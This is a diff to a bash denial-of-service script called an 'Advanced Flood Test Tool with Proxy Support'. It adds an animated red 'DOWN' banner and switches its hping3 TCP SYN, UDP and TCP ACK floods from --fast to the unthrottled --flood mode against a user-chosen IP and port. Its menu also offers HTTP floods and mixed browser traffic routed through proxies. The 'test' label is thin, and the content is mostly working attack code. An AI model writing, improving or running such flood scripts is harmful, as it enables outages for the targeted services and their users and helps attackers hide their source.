@@ -1,5 +1,51 @@
 #!/bin/bash
 
+# --- Animated Banner Function ---
+display_banner() {
+    clear
+    echo -e "\e[1;31m" # Set text to bold red
+    echo '                                                                    '
+    sleep 0.05
+    echo 'DDDDDDDDDDDDD      OOOOOOOOO     WWWWWWWW               WWWWWWWWNNNNNNNN        NNNNNNNN'
+    sleep 0.05
+    echo 'D::::::::::::DDD  OO:::::::::OO   W::::::W               W::::::WN:::::::N       N::::::N'
+    sleep 0.05
+    echo 'D:::::::::::::::DDO:::::::::::::O  W::::::W               W::::::WN::::::::N      N::::::N'
+    sleep 0.05
+    echo 'DDD:::::DDDDD:::::O:::::OOO:::::O W::::::W               W::::::WN:::::::::N     N::::::N'
+    sleep 0.05
+    echo '  D:::::D    D::::O::::O   O::::O  W:::::W     WWWWW     W:::::W N::::::::::N    N::::::N'
+    sleep 0.05
+    echo '  D:::::D     D:::O::::O   O::::O   W:::::W   W:::::W   W:::::W  N:::::::::::N   N::::::N'
+    sleep 0.05
+    echo '  D:::::D     D:::O::::O   O::::O    W:::::W W:::::W W:::::W   N:::::N:::::::N  N::::::N'
+    sleep 0.05
+    echo '  D:::::D     D:::O::::O   O::::O     W:::::W:::::W:::::W    N:::::N N:::::::N N::::::N'
+    sleep 0.05
+    echo '  D:::::D     D:::O::::O   O::::O      W:::::::::W:::::::::W     N:::::N  N:::::::NN::::::N'
+    sleep 0.05
+    echo '  D:::::D     D:::O::::O   O::::O       W:::::::W:::::::W      N:::::N   N:::::::N::::::N'
+    sleep 0.05
+    echo '  D:::::D     D:::O::::O   O::::O        W:::::W W:::::W       N:::::N    N:::::::N:::::N'
+    sleep 0.05
+    echo '  D:::::D    D::::O::::O   O::::O         W:::W   W:::W        N:::::N     N:::::::N::::N'
+    sleep 0.05
+    echo 'DDD:::::DDDDD:::::O:::::OOO:::::O          W:W     W:W         N:::::N      N:::::::N:::N'
+    sleep 0.05
+    echo 'D:::::::::::::::DDO:::::::::::::O           W       W          N:::::N       N::::::::::N'
+    sleep 0.05
+    echo 'D::::::::::::DDD  OO:::::::::OO              W     W           N:::::N        N:::::::::N'
+    sleep 0.05
+    echo 'DDDDDDDDDDDDD      OOOOOOOOO                 W   W            NNNNNNN         NNNNNNNNN '
+    sleep 0.05
+    echo '                                                                    '
+    echo -e "\e[0m" # Reset text color
+    sleep 1
+}
+
+# --- Main Script ---
+display_banner
+
 echo "=== Advanced Flood Test Tool with Proxy Support ==="
 
 # Get user input
@@ -16,7 +62,7 @@ count=${count:-1000}
 echo ""
 echo "Select flood type:"
 echo "1) TCP SYN Flood"
-echo "2) UDP Flood" 
+echo "2) UDP Flood"
 echo "3) TCP ACK Flood"
 echo "4) HTTP Flood through Proxies"
 echo "5) Mixed Browser Traffic through Proxies"
@@ -44,15 +90,15 @@ PROXIES=(
 case $protocol in
   1)
     echo "Type: TCP SYN Flood"
-    hping3 -S -p $port -c $count --fast $ip
+    hping3 -S -p $port -c $count --flood $ip
     ;;
   2)
-    echo "Type: UDP Flood" 
-    hping3 -2 -p $port -c $count --fast $ip
+    echo "Type: UDP Flood"
+    hping3 -2 -p $port -c $count --flood $ip
     ;;
   3)
     echo "Type: TCP ACK Flood"
-    hping3 -A -p $port -c $count --fast $ip
+    hping3 -A -p $port -c $count --flood $ip
     ;;
   4)
     echo "Type: HTTP Flood through 10 Proxies"
@@ -126,7 +172,7 @@ case $protocol in
     
   *)
     echo "Invalid selection. Using TCP SYN Flood."
-    hping3 -S -p $port -c $count --fast $ip
+    hping3 -S -p $port -c $count --flood $ip
     ;;
 esac
 
